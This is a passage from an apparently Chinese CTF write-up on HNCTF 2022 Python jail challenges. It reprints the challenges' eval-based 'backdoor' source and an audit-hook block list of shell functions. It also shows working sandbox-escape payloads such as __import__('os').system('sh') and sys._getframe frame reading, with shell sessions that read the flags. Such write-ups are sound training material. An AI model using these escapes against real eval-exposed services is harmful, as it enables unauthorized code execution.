number">0x7f5d28848a90</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__annotations__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'builtins'</span> <span class="token punctuation">(</span>built<span class="token operator">-</span><span class="token keyword">in</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">:</span> <span class="token string">'/home/ctf/./server.py'</span><span class="token punctuation">,</span> <span class="token string">'__cached__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'key_9b1d015375213e21'</span><span class="token punctuation">:</span> <span class="token string">'a34af94e88aed5c34fb5ccfe08cd14ab'</span><span class="token punctuation">,</span> <span class="token string">'func'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function func at <span class="token number">0x7f5d289e7d90</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'backdoor'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function backdoor at <span class="token number">0x7f5d288a9fc0</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'WELCOME'</span><span class="token punctuation">:</span> '\n  _       _          _       _          _       _        \n <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>       \n <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____ \n <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \\ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \\ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span>\n <span class="token operator">|</span>_<span class="token operator">|</span>\\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\\_\\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\\_\\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\\_\\___<span class="token operator">|</span>                            \n<span class="token string">', '</span>input_data<span class="token string">': '</span><span class="token number">1</span>'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到key’的值： ‘a34af94e88aed5c34fb5ccfe08cd14ab’</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28632</span>  _       _          _       _          _       _ <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span>Now the program has two functionscan you use dockerdoor<span class="token number">1</span><span class="token punctuation">.</span>func<span class="token number">2</span><span class="token punctuation">.</span>backdoor<span class="token operator">></span> <span class="token number">2</span>Please enter the admin key<span class="token operator">></span>a34af94e88aed5c34fb5ccfe08cd14ab<span class="token operator">></span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ lsflag  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>da5f4f8a<span class="token operator">-</span><span class="token number">3839</span><span class="token operator">-</span>4c3c<span class="token operator">-</span>9dd6<span class="token operator">-</span>60de30fe299e<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hnctf-2022-week1lke-lke-lkejail"><a class="markdownIt-Anchor" href="#hnctf-2022-week1lke-lke-lkejail"></a> [HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#it seems have a backdoor as `lake lake lake`</span><span class="token comment">#but it seems be limited!</span><span class="token comment">#can u find the key of it and use the backdoor</span>fake_key_var_in_the_local_but_real_in_the_remote <span class="token operator">=</span> <span class="token string">"[DELETED]"</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_var_in_the_local_but_real_in_the_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nooo!!!!"</span><span class="token punctuation">)</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _         _          _         _          _         _         | |  ____ | |        | |  ____ | |        | |  ____ | |        | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____  | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|     \____/               \____/               \____/                                                                                                                                                                                                                                        '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Now the program has two functions"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"can you use dockerdoor"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.func"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.backdoor"</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    func<span class="token punctuation">(</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">elif</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"not found the choice"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知func长度限制dao了6，这时我们就可以试试之前用过的help函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Welcome to Python <span class="token number">3.10</span>'s <span class="token builtin">help</span> utility!If this <span class="token keyword">is</span> your first time using Python<span class="token punctuation">,</span> you should definitely check outthe tutorial on the internet at https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>python<span class="token punctuation">.</span>org<span class="token operator">/</span><span class="token number">3.10</span><span class="token operator">/</span>tutorial<span class="token operator">/</span><span class="token punctuation">.</span>Enter the name of <span class="token builtin">any</span> module<span class="token punctuation">,</span> keyword<span class="token punctuation">,</span> <span class="token keyword">or</span> topic to get <span class="token builtin">help</span> on writingPython programs <span class="token keyword">and</span> using Python modules<span class="token punctuation">.</span>  To quit this <span class="token builtin">help</span> utility <span class="token keyword">and</span><span class="token keyword">return</span> to the interpreter<span class="token punctuation">,</span> just <span class="token builtin">type</span> <span class="token string">"quit"</span><span class="token punctuation">.</span>To get a <span class="token builtin">list</span> of available modules<span class="token punctuation">,</span> keywords<span class="token punctuation">,</span> symbols<span class="token punctuation">,</span> <span class="token keyword">or</span> topics<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token string">"modules"</span><span class="token punctuation">,</span> <span class="token string">"keywords"</span><span class="token punctuation">,</span> <span class="token string">"symbols"</span><span class="token punctuation">,</span> <span class="token keyword">or</span> <span class="token string">"topics"</span><span class="token punctuation">.</span>  Each module also comes<span class="token keyword">with</span> a one<span class="token operator">-</span>line summary of what it does<span class="token punctuation">;</span> to <span class="token builtin">list</span> the modules whose name<span class="token keyword">or</span> summary contain a given string such <span class="token keyword">as</span> <span class="token string">"spam"</span><span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token string">"modules spam"</span><span class="token punctuation">.</span><span class="token builtin">help</span><span class="token operator">></span> __main__Help on module __main__<span class="token punctuation">:</span>NAME    __main__DESCRIPTION    <span class="token comment">#it seems have a backdoor as `lake lake lake`</span>    <span class="token comment">#but it seems be limited!</span>    <span class="token comment">#can u find the key of it and use the backdoor</span>FUNCTIONS    backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>    func<span class="token punctuation">(</span><span class="token punctuation">)</span>DATA    WELCOME <span class="token operator">=</span> '\n  _         _          _         _          _  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    __annotations__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    input_data <span class="token operator">=</span> <span class="token string">'1'</span>    key_9d38ee7f31d6126d <span class="token operator">=</span> <span class="token string">'95c720690c2c83f0982ffba63ff87338'</span>FILE    <span class="token operator">/</span>home<span class="token operator">/</span>ctf<span class="token operator">/</span>server<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我吗输入__ main __ 的时候我们会得到该模块的帮助。</p><p>然后得到key的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28751</span>  _         _          _         _          _         _ <span class="token operator">|</span> <span class="token operator">|</span>  ____ <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>  ____ <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>  ____ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">/</span> __ \<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">/</span> __ \<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">/</span> __ \<span class="token operator">|</span> <span class="token operator">|</span> _____ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span>_<span class="token operator">|</span>\ \__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\ \__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\ \__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span>     \____<span class="token operator">/</span>               \____<span class="token operator">/</span>               \____<span class="token operator">/</span>Now the program has two functionscan you use dockerdoor<span class="token number">1</span><span class="token punctuation">.</span>func<span class="token number">2</span><span class="token punctuation">.</span>backdoor<span class="token operator">></span> <span class="token number">2</span>Please enter the admin key<span class="token operator">></span>95c720690c2c83f0982ffba63ff87338<span class="token operator">></span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ ls__pycache__  flag  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>eec5b8a6<span class="token operator">-</span>ca31<span class="token operator">-</span>42f5<span class="token operator">-</span>8d72<span class="token operator">-</span>99d952240b09<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hnctf-2022-week2lak3-lak3-lak3jail"><a class="markdownIt-Anchor" href="#hnctf-2022-week2lak3-lak3-lak3jail"></a> [HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Hi hackers,lak3 comes back</span><span class="token comment">#Have a good luck on it! :Wink:</span><span class="token keyword">import</span> random<span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO<span class="token keyword">import</span> syssys<span class="token punctuation">.</span>addaudithookBLACKED_LIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">]</span>eval_func <span class="token operator">=</span> <span class="token builtin">eval</span>open_func <span class="token operator">=</span> <span class="token builtin">open</span><span class="token keyword">for</span> m <span class="token keyword">in</span> BLACKED_LIST<span class="token punctuation">:</span>    <span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">my_audit_hook</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">:</span>    BALCKED_EVENTS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'pty.spawn'</span><span class="token punctuation">,</span> <span class="token string">'os.system'</span><span class="token punctuation">,</span> <span class="token string">'os.exec'</span><span class="token punctuation">,</span> <span class="token string">'os.posix_spawn'</span><span class="token punctuation">,</span><span class="token string">'os.spawn'</span><span class="token punctuation">,</span><span class="token string">'subprocess.Popen'</span><span class="token punctuation">,</span><span class="token string">'code.__new__'</span><span class="token punctuation">,</span><span class="token string">'function.__new__'</span><span class="token punctuation">,</span><span class="token string">'cpython._PySys_ClearAuditHooks'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> event <span class="token keyword">in</span> BALCKED_EVENTS<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Operation banned: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">guesser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    game_score <span class="token operator">=</span> <span class="token number">0</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Can u guess the number? between 1 and 9999999999999 > '</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    right_guesser_question_answer <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9999999999999</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> challenge_original_stdout <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>stdout    <span class="token keyword">try</span><span class="token punctuation">:</span>        input_data <span class="token operator">=</span> eval_func<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> challenge_original_stdout        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Seems not right! please guess it!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> game_score    sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> challenge_original_stdout    <span class="token keyword">if</span> input_data <span class="token operator">==</span> right_guesser_question_answer<span class="token punctuation">:</span>        game_score <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> game_scoreWELCOME<span class="token operator">=</span><span class="token triple-quoted-string string">'''  _       _    ____    _       _    ____    _       _    ____   | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \  | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) | | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/                                                                                                                                                                        '''</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to my guesser game!'</span><span class="token punctuation">)</span>    game_score <span class="token operator">=</span> guesser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> game_score <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'you are really super guesser!!!!'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Guess game end!!!'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>my_audit_hook<span class="token punctuation">)</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把函数ban掉了，需要猜对数字才能获取flag</p><p>显而易见正确答案在right_guesser_question_answer里。</p><p>sys._getframe()函数<br>可以调用栈的帧对象，默认参数为0如果传入0那就会获取eval的调用栈帧，所以需要deep一层</p><p>有个小技巧，可以使用__import__(“sys”).<strong>stdout</strong>.write去进行标准输出，这也是上一个非预期的输出方法。</p><p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1)))</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28864</span>  _       _    ____    _       _    ____    _       _    ____ <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \  <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \  <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> __ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span>  <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span>  <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> 